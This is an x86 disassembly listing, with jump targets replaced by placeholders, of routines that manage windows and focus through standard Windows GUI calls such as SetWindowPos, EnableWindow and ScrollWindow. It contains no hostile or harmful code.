mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_454f68
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_454f90
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_466768
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_466670
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_4034ac
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_454f90
test al al
jne r-xdata
sub_454ff8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_454f90
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_455018
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_454f90
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_455058
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_466768
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_4034ac
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_455058
test al al
jne r-xdata
sub_4550bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_455058
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4550dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_452d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_450a20
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4550dc
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_45518c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_4550dc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_466768
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_450a20
test eax eax
jne r-xdata
sub_455234
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_455254
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_453cd4
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_455288
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_453cd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4552a8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_4552f8
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_45531c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_44eb20
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_452d84
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_452d48
mov dl [ esp ]
mov si 0xffd1
call sub_4034ac
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_455374
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_4034ac
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_455398
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_4034ac
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4553d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4514f4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_452de4
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_4535f4
sub_455408
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_4034ac
pop esi
pop ebx
retn
mov eax ebx
call sub_44feb0
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_40456c
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_40456c
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_455488
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4539d4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4515c8
sub_4554e8
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_453748
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_452b44
pop ebx
retn
sub_455518
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_455540
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_452b44
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_4555b0
push ebx
mov ebx eax
mov eax ebx
call sub_451434
mov eax ebx
call sub_456358
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_452de4
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_424408
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_450a20
sub_4555ec
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_44e100
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_456054
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_450a20
sub_45562c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_456358
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_456054
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45566c
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_452de4
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_455f5c
sub_4556ac
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_456194
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_456194
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_45570c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_45047c
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_44f398
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_453940
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_45577c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45156c
mov edx esi
mov eax ebx
call sub_452da4
pop esi
pop ebx
retn
sub_455798
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_44c790
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_466768
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_4034ac
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_4034ac
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_4034ac
test al al
jne r-xdata
sub_45582c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_4571c0
mov edx esi
mov eax ebx
call sub_455798
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_450a20
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_450a20
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_450a20
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_466768
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_450a20
test eax eax
jne r-xdata
jmp r-xdata
sub_455910
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_450a20
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_455964
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_450a20
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_466768
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_450a20
test eax eax
jne r-xdata
sub_4559b0
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_455798
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_450a20
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_466768
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_450a20
test eax eax
jne r-xdata
sub_455a0c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_466768
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_450a20
mov [ esi + 0xc ] eax
sub_455a40
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44eea8
mov eax ebx
mov si 0xffd0
call sub_4034ac
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_44f1f4
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_455b18
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_452d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_452d48
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_4034ac
inc edi
dec ebx
jne r-xdata
sub_455b60
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4528ec
xor eax eax
push ebp
push sub_455bfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_455b18
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f470
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455c05
mov eax [ ebp - 0x4 ]
call sub_4528f4
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_455c0c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_452914
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_452d48
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_455cfc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_418a0c
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_4188a0
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_418a2c
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4189b0
call sub_456054
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4189b0
call sub_456054
sub_455dd4
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_455cfc
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_455e34
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_456054
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_456054
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
test eax eax
jne r-xdata
sub_455e98
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_450a20
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_440198
call sub_440278
test al al
je r-xdata
mov eax ebx
call sub_452d84
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_452d48
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_452d48
test [ eax + 0x52 ] 0x4
je r-xdata
sub_455f5c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_44f1f4
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_455f94
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_466768
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_455fd4
push ebx
mov ebx eax
mov eax ebx
call sub_466768
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_46a4d4
pop ebx
retn
mov eax ebx
call sub_466790
mov eax ebx
call sub_456054
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_45600c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456030
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_456030
sub_456068
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_417358
mov eax edi
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_452d48
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_4560fc
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_456054
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_456134
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_456358
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_456054
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_4034ac
sub_4561f0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_418a0c
pop esi
pop ebx
retn
sub_456214
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_4561f0
